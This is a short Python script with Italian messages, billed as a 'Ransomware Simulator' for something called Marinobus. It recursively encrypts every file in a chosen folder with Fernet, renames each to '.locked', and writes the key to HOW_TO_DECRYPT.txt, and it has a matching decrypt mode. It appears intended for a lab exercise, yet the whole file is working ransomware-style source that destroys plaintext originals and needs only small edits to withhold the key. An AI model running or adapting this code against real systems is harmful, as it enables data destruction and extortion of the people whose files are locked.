#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

class SimpleRansomware:
    def __init__(self, key=None):
        self.key = key or Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = self.cipher.encrypt(data)
            os.rename(filepath, filepath + '.locked')
            with open(filepath + '.locked', 'wb') as f:
                f.write(encrypted)
            print(f"[+] Criptato: {filepath}")
        except Exception as e:
            print(f"[-] Errore: {e}")
    
    def decrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                encrypted = f.read()
            decrypted = self.cipher.decrypt(encrypted)
            original_path = filepath.replace('.locked', '')
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            os.remove(filepath)
            print(f"[+] Decriptato: {original_path}")
        except Exception as e:
            print(f"[-] Errore: {e}")
    
    def encrypt_folder(self, folder_path):
        print(f"\n[*] Inizio crittografia cartella: {folder_path}")
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if not file.endswith('.locked') and file != 'HOW_TO_DECRYPT.txt':
                    filepath = os.path.join(root, file)
                    self.encrypt_file(filepath)
        
        with open(os.path.join(folder_path, 'HOW_TO_DECRYPT.txt'), 'wb') as f:
            f.write(self.key)
        print(f"\n[!] Chiave salvata in: {folder_path}/HOW_TO_DECRYPT.txt")
    
    def decrypt_folder(self, folder_path):
        print(f"\n[*] Inizio decriptazione cartella: {folder_path}")
        key_file = os.path.join(folder_path, 'HOW_TO_DECRYPT.txt')
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
            self.cipher = Fernet(self.key)
            
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file.endswith('.locked'):
                        filepath = os.path.join(root, file)
                        self.decrypt_file(filepath)
            print("\n[+] Tutti i file decriptati!")
        else:
            print("[-] Chiave non trovata!")

if __name__ == "__main__":
    import sys
    
    print("╔══════════════════════════════════════╗")
    print("║   RANSOMWARE SIMULATOR - Marinobus   ║")
    print("╚══════════════════════════════════════╝\n")
    
    if len(sys.argv) < 3:
        print("Uso: python3 ransomware_win.py <encrypt|decrypt> <percorso>")
        print("Esempio: python3 ransomware_win.py encrypt /root/ransomware_test/marinobus_data")
        sys.exit(1)
    
    action = sys.argv[1]
    target = sys.argv[2]
    
    ransomware = SimpleRansomware()
    
    if action == "encrypt":
        ransomware.encrypt_folder(target)
        print("\n[+] Tutti i file criptati!")
        print("[!] Per decriptare: python3 ransomware_win.py decrypt <percorso>")
    elif action == "decrypt":
        ransomware.decrypt_folder(target)
    else:
        print("Azione non valida. Usa 'encrypt' o 'decrypt'")
